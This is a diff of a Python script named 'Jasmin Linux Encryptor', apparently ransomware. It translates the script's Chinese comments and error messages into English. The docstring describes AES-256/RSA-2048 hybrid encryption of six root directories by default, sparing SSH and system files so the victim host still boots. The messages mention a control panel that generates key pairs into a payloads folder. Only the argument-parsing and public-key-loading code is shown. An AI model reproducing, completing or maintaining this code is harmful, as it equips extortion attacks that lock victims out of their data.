@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 """
-Jasmin Linux Encryptor — AES-256-CBC + RSA-2048 混合加密
-保护SSH/系统文件不被加密，确保加密后系统可正常启动和SSH登录
+Jasmin Linux Encryptor - AES-256-CBC + RSA-2048 hybrid encryption
+Skips SSH/system files so the host still boots and accepts SSH after encryption
 """
 import os, sys, struct, hashlib
 from pathlib import Path
@@ -17,8 +17,8 @@ from cryptography.hazmat.backends import default_backend
 def load_public_key_path():
     import argparse
     ap = argparse.ArgumentParser(description='Jasmin Encryptor')
-    ap.add_argument('--pub', help='RSA 公钥 PEM 文件路径（或设 JASMIN_PUB）')
-    ap.add_argument('dirs', nargs='*', help='要加密的目录，默认 6 个根目录')
+    ap.add_argument('--pub', help='path to RSA public key PEM (or set JASMIN_PUB)')
+    ap.add_argument('dirs', nargs='*', help='directories to encrypt (default: 6 root dirs)')
     a = ap.parse_args()
     path = a.pub or os.environ.get('JASMIN_PUB') or ''
     if not path:
@@ -28,12 +28,12 @@ def load_public_key_path():
                 path = cand
                 break
     if not path or not os.path.exists(path):
-        sys.stderr.write('[!] 未找到 RSA 公钥。请用 --pub <file> 指定，或设置 JASMIN_PUB。\n')
-        sys.stderr.write('[!] 公钥在后台「生成RSA密钥对」后位于 payloads/jasmin_public.pem\n')
+        sys.stderr.write('[!] RSA public key not found. Use --pub <file> or set JASMIN_PUB.\n')
+        sys.stderr.write('[!] After generating a key pair in the panel it is at payloads/jasmin_public.pem\n')
         sys.exit(2)
     pem = open(path, 'rb').read()
     if b'PUBLIC KEY' not in pem:
-        sys.stderr.write('[!] %s 不是有效的 PEM 公钥\n' % path)
+        sys.stderr.write('[!] %s is not a valid PEM public key\n' % path)
         sys.exit(2)
     return pem, a.dirs
 
